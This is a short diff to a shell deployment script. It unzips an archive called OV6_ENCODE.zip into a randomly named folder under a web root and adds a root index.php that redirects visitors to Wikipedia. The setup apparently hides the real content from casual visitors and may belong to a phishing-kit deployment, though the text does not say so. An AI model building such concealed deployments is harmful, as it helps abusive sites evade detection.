@@ -106,6 +106,9 @@ random_string=$(uuidgen)
 mkdir -p /var/www/${domain}/${random_string}
 unzip -q OV6_ENCODE.zip -d "/var/www/${domain}/${random_string}"
 
+# Create and write the redirect script to index.php
+echo "<?php header('Location: https://www.wikipedia.org/'); exit();" > /var/www/${domain}/index.php
+
 # Move .htaccess if present
 if [[ -f "/var/www/${domain}/${random_string}/O V 6/.htaccess" ]]; then
     mv "/var/www/${domain}/${random_string}/O V 6/.htaccess" "/var/www/${domain}/${random_string}/"
